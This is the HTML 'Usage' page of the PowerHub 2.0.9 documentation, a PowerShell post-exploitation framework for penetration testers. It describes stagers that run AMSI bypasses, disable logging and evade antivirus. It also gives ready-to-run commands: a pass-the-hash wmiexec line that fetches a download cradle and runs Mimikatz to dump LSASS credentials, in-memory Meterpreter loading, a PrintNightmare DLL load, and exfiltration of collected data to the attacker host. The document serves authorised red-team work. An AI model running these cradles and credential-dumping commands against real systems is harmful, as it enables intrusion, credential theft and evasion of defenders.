@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en">
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Usage &mdash; PowerHub 2.0.9 documentation</title>
+      <link rel="stylesheet" type="text/css" href="_static/pygments.css" />
+      <link rel="stylesheet" type="text/css" href="_static/css/theme.css" />
+
+  
+  <!--[if lt IE 9]>
+    <script src="_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+        <script src="_static/jquery.js"></script>
+        <script src="_static/underscore.js"></script>
+        <script src="_static/_sphinx_javascript_frameworks_compat.js"></script>
+        <script src="_static/doctools.js"></script>
+    <script src="_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Troubleshooting" href="troubleshooting.html" />
+    <link rel="prev" title="Antivirus Evasion Techniques" href="evasion.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="index.html" class="icon icon-home">
+            PowerHub
+          </a>
+              <div class="version">
+                2.0.9
+              </div>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="installation.html">Installation and Quickstart</a></li>
+<li class="toctree-l1"><a class="reference internal" href="philosophy.html">Motivation &amp; Philosophy</a></li>
+<li class="toctree-l1"><a class="reference internal" href="new.html">New in PowerHub 2.0</a></li>
+<li class="toctree-l1"><a class="reference internal" href="changelog.html">Changelog</a></li>
+<li class="toctree-l1"><a class="reference internal" href="evasion.html">Antivirus Evasion Techniques</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Usage</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#nomenclature">Nomenclature</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#download-cradle">Download cradle</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#stager">Stager</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#launcher">Launcher</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#payload">Payload</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#module">Module</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#typical-workflow">Typical workflow</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#features">Features</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#hub">Hub</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#https">HTTPS</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#amsi-bypass">AMSI Bypass</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#key-exchange">Key Exchange</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#clip-exec">Clip-Exec</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#preload">Preload</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#modules">Modules</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#clipboard">Clipboard</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#file-exchange">File Exchange</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#static-files">Static Files</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#webdav">WebDAV</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#profile-ps1">profile.ps1</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#binary-payloads">Binary payloads</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#power-obfuscate">power-obfuscate</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#examples">Examples</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#running-mimikatz-on-a-remote-system">Running Mimikatz on a remote system</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#meterpreter">Meterpreter</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#empire">Empire</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id2">power-obfuscate</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="troubleshooting.html">Troubleshooting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="contrib.html">Contributing</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="index.html">PowerHub</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Usage</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="_sources/usage.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+
+           <div itemprop="articleBody">
+             
+  <section id="usage">
+<h1>Usage<a class="headerlink" href="#usage" title="Permalink to this heading"></a></h1>
+<section id="nomenclature">
+<h2>Nomenclature<a class="headerlink" href="#nomenclature" title="Permalink to this heading"></a></h2>
+<section id="download-cradle">
+<h3>Download cradle<a class="headerlink" href="#download-cradle" title="Permalink to this heading"></a></h3>
+<p>Download cradle is the one-liner that loads more code, typically in several
+stages, onto the target when executed.</p>
+</section>
+<section id="stager">
+<h3>Stager<a class="headerlink" href="#stager" title="Permalink to this heading"></a></h3>
+<p>By “stager” we mean the first stage that sets up all following stages. It
+will perform the following tasks:</p>
+<ul class="simple">
+<li><p>PowerHub will first define the routine for RC4 decryption and not much else.</p></li>
+<li><p>Then, a chosen AMSI bypass will be executed using RC4 for de-obfuscation.</p></li>
+<li><p>Next, logging will be disabled as much as possible, including the local
+history file.</p></li>
+<li><p>Then the second stage is loaded. It is RC4-encrypted and will define more
+routines that allow us to load following stages more conveniently. For
+example, it will define some routines that take advantage of AES
+libraries so encryption will perform better. Also, a secondary
+<a class="reference external" href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">process-specific</a>
+AMSI bypass is loaded.</p></li>
+<li><p>Now we are ready to load the actual payload. By default, it is the
+actual “PowerHub” PowerShell module. It is responsible for manually
+loading PowerHub modules, mounting WebDAV directories, routines for
+sending back files and shell output, and so on.</p></li>
+<li><p>If configured by the user, some PowerHub modules will come pre-loaded.
+Also, the contents of a <code class="docutils literal notranslate"><span class="pre">profile.ps1</span></code> will be executed at the end of the
+last stage.</p></li>
+</ul>
+</section>
+<section id="launcher">
+<h3>Launcher<a class="headerlink" href="#launcher" title="Permalink to this heading"></a></h3>
+<p>By launcher we mean the thing that executes the download cradle. Most of the
+time, it will be a PowerShell session, but it could also be a <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>
+session. It could also be Bash, meaning you could pass the download cradle
+as a Bash argument to <code class="docutils literal notranslate"><span class="pre">wmiexec</span></code> or something similar that will execute the
+command on some target.</p>
+</section>
+<section id="payload">
+<h3>Payload<a class="headerlink" href="#payload" title="Permalink to this heading"></a></h3>
+<p>PowerHub supports the generation of binary payloads as well. Instead of a
+download cradle, you will get a link to an EXE file that will do the same thing.
+There are some system dependencies necessary to compile the code. This might
+easily trigger some anti virus agents, though.</p>
+</section>
+<section id="module">
+<h3>Module<a class="headerlink" href="#module" title="Permalink to this heading"></a></h3>
+<p>A module, or more specifically a PowerHub module, is the actual malicious
+code. It could be a PowerShell file, a .NET binary, a PE binary or
+shell code. The latter two will be executed by using PowerSploit’s
+<code class="docutils literal notranslate"><span class="pre">Invoke-ReflectivePEInjection</span></code> or <code class="docutils literal notranslate"><span class="pre">Invoke-Shellcode</span></code>, both of which must be
+loaded separately first.</p>
+</section>
+</section>
+<section id="typical-workflow">
+<h2>Typical workflow<a class="headerlink" href="#typical-workflow" title="Permalink to this heading"></a></h2>
+<p>Most users of PowerHub run it on a system they control, preferably on the
+same network as their potential targets. If you must run it on the internet,
+consider using the <code class="docutils literal notranslate"><span class="pre">--allow</span></code> flag to restrict access to IP addresses you’d
+expect.</p>
+<p>On targets that you can control interactively, use a browser to navigate to
+the PowerHub instance. Copy the download cradle and run it in a PowerShell
+session. Running <code class="docutils literal notranslate"><span class="pre">Help-PowerHub</span></code> will help you get started. Most commands
+can also be referred to by a short alias (example: <code class="docutils literal notranslate"><span class="pre">ghm</span></code> for
+<code class="docutils literal notranslate"><span class="pre">Get-HubModule</span></code>).</p>
+<p>The default settings work most of the time. If the antivirus interferes,
+play around with the settings. The more checkboxes you tick, the least
+likely it should be detected by an antivirus. However, you may lose some
+features, convenience or speed.</p>
+<p>On the client you can selectively load more modules and execute them,
+hopefully without triggering the antivirus. Output can be transferred back
+via <code class="docutils literal notranslate"><span class="pre">PushTo-Hub</span></code> or the web interface.</p>
+</section>
+<section id="features">
+<h2>Features<a class="headerlink" href="#features" title="Permalink to this heading"></a></h2>
+<section id="hub">
+<h3>Hub<a class="headerlink" href="#hub" title="Permalink to this heading"></a></h3>
+<p>The first tab lets you configure the download cradle. The transport method
+can be HTTP or HTTPS (SMB might be coming in the future). Usage of the
+system’s default HTTP proxy can be enabled on demand.</p>
+<section id="https">
+<h4>HTTPS<a class="headerlink" href="#https" title="Permalink to this heading"></a></h4>
+<p>In case of HTTPS we can do certificate pinning, use the Windows certificate
+store or disable verification entirely.</p>
+<p>Also, some versions of Windows are reluctant to use TLSv1.2 for whatever
+reason. There is a checkbox to enforce TLSv1.2 in case your system on which
+the Python backend is running does not support earlier versions.</p>
+</section>
+<section id="amsi-bypass">
+<h4>AMSI Bypass<a class="headerlink" href="#amsi-bypass" title="Permalink to this heading"></a></h4>
+<p>There is a choice of AMSI bypasses. In my experience, the original bypass by
+Matt Graeber still works most of the time using PowerHub’s obfuscation
+mechanism. Some are known to trigger the Microsoft Defender, but they are
+there in case other antiviruses won’t recognize them. Some use features that
+will break the stager if the PowerShell version is less than 5.</p>
+<p>A
+<a class="reference external" href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/">process-specific</a>
+AMSI bypass will automatically be loaded right after the first one.</p>
+</section>
+<section id="key-exchange">
+<h4>Key Exchange<a class="headerlink" href="#key-exchange" title="Permalink to this heading"></a></h4>
+<p>The key which is used for the RC4 and AES encryption is used can be
+exchanged using different mechanism with different pros and cons.</p>
+<p>By default, the key exchange happens out-of-band. This means that it won’t
+be visible easily on the wire. It’s also not likely that it will be
+recovered in forensics after the fact.</p>
+<p>It’s next to impossible to recover the key in forensics if Diffie-Hellman is
+used for the key exchange. However, an active analyst that has
+unathenticated access to the PowerHub server while it is running could
+retrieve it.</p>
+<p>Note that no host verification will be performed on top of the HTTPS
+connection, so this might be vulnerable to highly specific active
+man-in-the-middle attacks.</p>
+<p>The DH key exchange requires an extra request, which may not always be an
+option, so we can also embed they key directly in which case the key can
+be recovered trivially by a forensic analyst “post-mortem”. However, this
+will be most compact, which can sometimes be useful.</p>
+</section>
+<section id="clip-exec">
+<h4>Clip-Exec<a class="headerlink" href="#clip-exec" title="Permalink to this heading"></a></h4>
+<p>The hub also lets us specify a Clipboard entry to be executed automatically
+after the last stage has loaded.</p>
+</section>
+<section id="preload">
+<h4>Preload<a class="headerlink" href="#preload" title="Permalink to this heading"></a></h4>
+<p>Modules can be pre-loaded, so they will be included as an additional stage.</p>
+<p>Together with the “embedded” key exchange option, this will produce an
+entirely self-contained file that could also be transported to the target
+host in arbitrary ways such as a USB drive. The “out-of-band” could also be
+used, just remember to define the key variable on the command line as seen
+in the download cradle.</p>
+</section>
+</section>
+<section id="modules">
+<h3>Modules<a class="headerlink" href="#modules" title="Permalink to this heading"></a></h3>
+<p>This tab show the modules and lets you download some select modules
+conveniently.</p>
+<p>Modules have a name as well as a number and can be referred to by both,
+where the name is identical to the path of the module on the host relative
+to the modules directory. Note that the number can change if modules are
+added or removed, in which case you should run <code class="docutils literal notranslate"><span class="pre">Update-HubModules</span></code> on the
+target.</p>
+<p>They can be loaded on the target with <code class="docutils literal notranslate"><span class="pre">Get-HubModule</span></code>. You can pass a
+regular expression, a number or a list of numbers. The modules will be
+returned on the command line and can be passed to another Cmdlet. The code
+of each module will be transferred in encrypted form and on demand (“lazy
+loading”). If the code of a module changed server-side, use the <code class="docutils literal notranslate"><span class="pre">-Reload</span></code>
+argument to force reloading the code.</p>
+<p>PowerShell modules will be loaded by piping them to <code class="docutils literal notranslate"><span class="pre">Invoke-Expression</span></code>.
+.NET modules and PE modules can be executed to <code class="docutils literal notranslate"><span class="pre">Run-DotNetExe</span></code> or <code class="docutils literal notranslate"><span class="pre">Run-Exe</span></code>
+respectively. The latter requires PowerSploit’s
+<code class="docutils literal notranslate"><span class="pre">Invoke-ReflectivePEInjection</span></code> to be loaded first. An alias will be created
+that is the same as the base name, i.e. if you execute <code class="docutils literal notranslate"><span class="pre">Get-HubModule</span> <span class="pre">SharpHound.exe</span></code>, you will be able to execute SharpHound by calling
+<code class="docutils literal notranslate"><span class="pre">SharpHound.exe</span></code> afterwards. Despite the name, it’s a PowerShell function
+(or alias). It will then call the module in-memory.</p>
+</section>
+<section id="clipboard">
+<h3>Clipboard<a class="headerlink" href="#clipboard" title="Permalink to this heading"></a></h3>
+<p>The clipboard serves as a place to share small snippets, like one-liners of
+code, hashes, credentials, etc. Either with yourself on different systems or
+with collaborators.</p>
+<p>Clipboard entries can be marked as “executable”, so they can be specified in
+the download cradle. Their contents will then be executed automatically
+after loading the last stage. This is useful if you are experimenting with a
+particular command and want to keep the download cradle constant.</p>
+</section>
+<section id="file-exchange">
+<h3>File Exchange<a class="headerlink" href="#file-exchange" title="Permalink to this heading"></a></h3>
+<p>The file exchange offers a way to transfer files via HTTP back to the host.
+Think <a class="reference external" href="https://github.com/stackp/Droopy">Droopy</a>.</p>
+<p>This feature can also be used on the command line with <code class="docutils literal notranslate"><span class="pre">PushTo-Hub</span></code>. It can
+transfer files or data from stdin via HTTP back to the PowerHub server.</p>
+</section>
+<section id="static-files">
+<h3>Static Files<a class="headerlink" href="#static-files" title="Permalink to this heading"></a></h3>
+<p>Sometimes you simply need to serve some static files (payloads, tools, etc.)
+using an HTTP server that are available without any authentication. These are
+situations where you might be tempted to fire up <code class="docutils literal notranslate"><span class="pre">python</span> <span class="pre">-m</span> <span class="pre">http.server</span></code>. If
+you are already running PowerHub, just put your files inside the static
+folder instead. It will respect the tree-like structure of files and
+directories and make them accessible for everyone without authentication.</p>
+</section>
+<section id="webdav">
+<h3>WebDAV<a class="headerlink" href="#webdav" title="Permalink to this heading"></a></h3>
+<p>PowerHub also provides several WebDAV shares. You can mount it on the target as
+two network drives with <code class="docutils literal notranslate"><span class="pre">Mount-WebDAV</span></code> or <code class="docutils literal notranslate"><span class="pre">mwd</span></code> (as <code class="docutils literal notranslate"><span class="pre">S:</span></code> and <code class="docutils literal notranslate"><span class="pre">R:</span></code> by
+default). Be careful, it allows anonymous access.</p>
+<p>One drive is read-only – maybe you can bypass a weak anti virus with this.
+Some exploits require a DLL, so the idea is that you mount the  WebDAV
+drive, put malicious DLLs in the read-only directory, and then load them
+like this:</p>
+<div class="highlight-ps1con notranslate"><div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">cve</span><span class="p">-</span><span class="n">2021</span><span class="p">-</span><span class="n">1675</span><span class="p">.</span><span class="n">ps1</span>
+<span class="gp">PS C:\&gt; </span><span class="nb">Invoke-Nightmare</span> <span class="n">-DLL</span> <span class="s2">&quot;R:\evil-exploit-code.dll&quot;</span>
+</pre></div>
+</div>
+<p>The other has two folders and is writable by everyone:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">public</span></code> with read/write access for everyone</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">blackhole</span></code> for dropping sensitive data. Any file placed here via WebDAV
+will immediately be moved to the <code class="docutils literal notranslate"><span class="pre">upload</span></code> directory on the attacker machine.</p></li>
+</ul>
+</section>
+<section id="profile-ps1">
+<h3>profile.ps1<a class="headerlink" href="#profile-ps1" title="Permalink to this heading"></a></h3>
+<p>You can create the file <code class="docutils literal notranslate"><span class="pre">profile.ps1</span></code> in <code class="docutils literal notranslate"><span class="pre">$XDG_DATA_HOME/powerhub/</span></code> which
+will be automatically executed when loading PowerHub on the Windows machine.
+This is my <code class="docutils literal notranslate"><span class="pre">profile.ps1</span></code>:</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="c"># Make powershell tab completion behave more like bash</span>
+<span class="k">try</span> <span class="p">{</span><span class="nb">Set-PSReadlineKeyHandler</span> <span class="n">-Key</span> <span class="n">Tab</span> <span class="n">-Function</span> <span class="n">Complete</span><span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
+
+<span class="k">function</span> <span class="nb">Invoke-SharpHound</span> <span class="p">{</span>
+    <span class="k">Param</span><span class="p">(</span>
+        <span class="p">[</span><span class="k">parameter</span><span class="p">(</span><span class="k">Mandatory</span><span class="p">=</span><span class="nv">$False</span><span class="p">,</span> <span class="k">ValueFromPipeline</span><span class="p">=</span><span class="nv">$True</span><span class="p">)]</span>
+        <span class="no">[String[]]</span><span class="nv">$Domain</span> <span class="p">=</span> <span class="s2">&quot;Default&quot;</span>
+    <span class="p">)</span>
+    <span class="k">Process</span> <span class="p">{</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$d</span> <span class="k">in</span> <span class="nv">$Domain</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">Get-HubModule</span> <span class="s2">&quot;sharphound.exe&quot;</span> <span class="p">|</span> <span class="n">Run-DotNETExe</span> <span class="n">-Arguments</span> <span class="s2">&quot;-c&quot;</span><span class="p">,</span><span class="s2">&quot;All&quot;</span><span class="p">,</span><span class="s2">&quot;--trackcomputercalls&quot;</span><span class="p">,</span><span class="s2">&quot;--zipfilename&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="s2">&quot;--outputdirectory&quot;</span><span class="p">,(</span><span class="nb">Get-Location</span><span class="p">).</span><span class="n">Path</span>
+            <span class="n">PushTo-Hub</span> <span class="p">(</span><span class="nb">Get-ChildItem</span> <span class="s2">&quot;*_$d.zip&quot;</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c"># Put some commands that I pretty much always want to run in one function</span>
+<span class="k">function</span> <span class="n">Run-Init</span> <span class="p">{</span>
+    <span class="nb">Get-SysInfo</span> <span class="p">|</span> <span class="n">PushTo-Hub</span> <span class="n">-Name</span> <span class="n">sysinfo</span><span class="p">.</span><span class="n">txt</span>
+    <span class="nb">Get-HubModule</span> <span class="s2">&quot;PrivescCheck.ps1&quot;</span>
+    <span class="nb">Invoke-PrivescCheck</span> <span class="n">-Extended</span> <span class="n">-Report</span> <span class="n">privesccheck</span> <span class="n">-Format</span> <span class="n">TXT</span><span class="p">,</span><span class="n">XML</span><span class="p">,</span><span class="n">CSV</span>
+    <span class="n">PushTo-Hub</span> <span class="s2">&quot;privesccheck.txt&quot;</span>
+    <span class="n">PushTo-Hub</span> <span class="s2">&quot;privesccheck.xml&quot;</span>
+    <span class="n">PushTo-Hub</span> <span class="s2">&quot;privesccheck.csv&quot;</span>
+    <span class="nb">Invoke-SharpHound</span>
+    <span class="nb">Get-HubModule</span> <span class="s2">&quot;Greenshot_for_PortableApps&quot;</span> <span class="p">|</span> <span class="n">Run-Exe</span> <span class="n">-OnDisk</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</section>
+<section id="binary-payloads">
+<span id="id1"></span><h3>Binary payloads<a class="headerlink" href="#binary-payloads" title="Permalink to this heading"></a></h3>
+<p>PowerHub can build binaries that execute the download cradle. The supported
+formats are:</p>
+<ul class="simple">
+<li><p>Visual Basic Script (<code class="docutils literal notranslate"><span class="pre">*.vbs</span></code>)</p></li>
+<li><p>PE Executables</p></li>
+<li><p>.NET Executables</p></li>
+</ul>
+<p>Since they are build with the MinGW cross-compiler, they are near certainly
+flagged as malicious by antivirus software.</p>
+</section>
+<section id="power-obfuscate">
+<h3>power-obfuscate<a class="headerlink" href="#power-obfuscate" title="Permalink to this heading"></a></h3>
+<p>The Python script <code class="docutils literal notranslate"><span class="pre">power-obfuscate</span></code> can be used to leverage PowerHub’s evasion
+techniques without requiring the web server. It will allow you to build a
+self-contained obfuscated PowerShell file that contains another PowerShell
+script or a .NET binary. It supports some of the hub’s configuration
+options, such as the option to use natural variable names.</p>
+<p>Run <code class="docutils literal notranslate"><span class="pre">power-obfuscate</span> <span class="pre">--help</span></code> for details.</p>
+</section>
+</section>
+<section id="examples">
+<h2>Examples<a class="headerlink" href="#examples" title="Permalink to this heading"></a></h2>
+<section id="running-mimikatz-on-a-remote-system">
+<h3>Running Mimikatz on a remote system<a class="headerlink" href="#running-mimikatz-on-a-remote-system" title="Permalink to this heading"></a></h3>
+<p>One nice application is, for example, the case where you have obtained some
+local administrator password hash and want to move laterally. This dumps the
+LSASS creds with <a class="reference external" href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> via <a class="reference external" href="https://github.com/SecureAuthCorp/impacket">Impacket</a>’s <code class="docutils literal notranslate"><span class="pre">wmiexec.py</span></code>:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>wmiexec.py<span class="w"> </span>-hashes<span class="w"> </span>:deadbeef0000000000000000deadbeef<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>./administrator@10.0.1.4<span class="w">  </span><span class="se">\</span>
+<span class="w">    </span><span class="s1">&#39;powershell -c &quot;$K=new-object net.webclient;IEX $K.downloadstring(\&quot;http://10.0.100.13:8000/\&quot;); ghm Mimikatz; Invoke-Mimikatz | pth -Name mimikatz.txt &quot;&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="meterpreter">
+<h3>Meterpreter<a class="headerlink" href="#meterpreter" title="Permalink to this heading"></a></h3>
+<p>Let’s say you want to execute a Meterpreter in memory, then you do this after placing <code class="docutils literal notranslate"><span class="pre">meterpreter.exe</span></code> in <code class="docutils literal notranslate"><span class="pre">$XDG_DATA_HOME/powerhub/modules/exe</span></code> (don’t forget to reload the modules!):</p>
+<div class="highlight-ps1con notranslate"><div class="highlight"><pre><span></span><span class="gp">PS C:\Users\pentestuser&gt; </span><span class="nv">$K</span><span class="p">=</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">;</span><span class="nb">IEX </span><span class="nv">$K</span><span class="p">.</span><span class="n">downloadstring</span><span class="p">(</span><span class="s2">&quot;http://10.0.100.13:8000/0&quot;</span><span class="p">);</span>
+<span class="gp">PS C:\Users\pentestuser&gt; </span><span class="n">ghm</span> <span class="n">ReflectivePEInjection</span><span class="p">;</span> <span class="n">ghm</span> <span class="n">meterpreter</span><span class="p">.</span><span class="n">exe</span><span class="p">|</span><span class="n">re</span>
+</pre></div>
+</div>
+<p>It should be a staged Meterpreter to keep the binary sufficiently small. I usually use <code class="docutils literal notranslate"><span class="pre">windows/x64/meterpreter/reverse_https</span></code>.</p>
+</section>
+<section id="empire">
+<h3>Empire<a class="headerlink" href="#empire" title="Permalink to this heading"></a></h3>
+<p>Add an Empire launcher to the clipboard, mark it as “executable”, then choose the corresponding clipboard ID as “Clip-Exec” in the PowerHub cradle builder.</p>
+</section>
+<section id="id2">
+<h3>power-obfuscate<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h3>
+<p>Turn <code class="docutils literal notranslate"><span class="pre">SharpHound.exe</span></code> into a PowerShell script and execute it upon running
+the script:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$ </span>power-obfuscate<span class="w"> </span>-i<span class="w"> </span>SharpHound.exe<span class="w"> </span>-o<span class="w"> </span>sharphound.ps1<span class="w"> </span>-n<span class="w"> </span>-y<span class="w"> </span>--epilogue<span class="w"> </span><span class="s1">&#39;SharpHound.exe -c All&#39;</span>
+<span class="go">I 2023-02-18 16:09:14 Output written to sharphound.ps1</span>
+<span class="go">I 2023-02-18 16:09:14 Execute the file with &#39;cat sharphound.ps1|iex&#39; or &#39;ipmo sharphound.ps1&#39; on the target</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+<a href="https://github.com/AdrianVollmer/PowerHub" target="_blank"><img decoding="async" loading="lazy" width="149" height="149" src="https://github.blog/wp-content/uploads/2008/12/forkme_right_white_ffffff.png?resize=149%2C149" class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1" style="position: absolute; top: 0; right: 0; border: 0;"></a>
+
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="evasion.html" class="btn btn-neutral float-left" title="Antivirus Evasion Techniques" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="troubleshooting.html" class="btn btn-neutral float-right" title="Troubleshooting" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2018-2023, Adrian Vollmer.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  
+
+  <div class="rst-versions" data-toggle="rst-versions" role="note" aria-label="versions">
+    <span class="rst-current-version" data-toggle="rst-current-version">
+      <span class="fa fa-book"> Read the Docs</span>
+      v: 2.0.9
+      <span class="fa fa-caret-down"></span>
+    </span>
+    <div class="rst-other-versions">
+      
+      <dl>
+        <dt>Versions</dt>
+        
+          
+          <dd><a href="/PowerHub/2.0.0/">2.0.0</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.1/">2.0.1</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.2/">2.0.2</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.3/">2.0.3</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.4/">2.0.4</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.5/">2.0.5</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.6/">2.0.6</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.7/">2.0.7</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/2.0.8/">2.0.8</a></dd>
+          
+        
+           <strong> 
+          <dd><a href="/PowerHub/2.0.9/">2.0.9</a></dd>
+           </strong> 
+        
+          
+          <dd><a href="/PowerHub/latest/">latest</a></dd>
+          
+        
+          
+          <dd><a href="/PowerHub/master/">master</a></dd>
+          
+        
+      </dl>
+      
+      <hr/>
+    </div>
+  </div>
+<script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>  
+
+  <link rel="stylesheet" type="text/css" href="_static/custom.css">
+
+
+
+</body>
+</html>
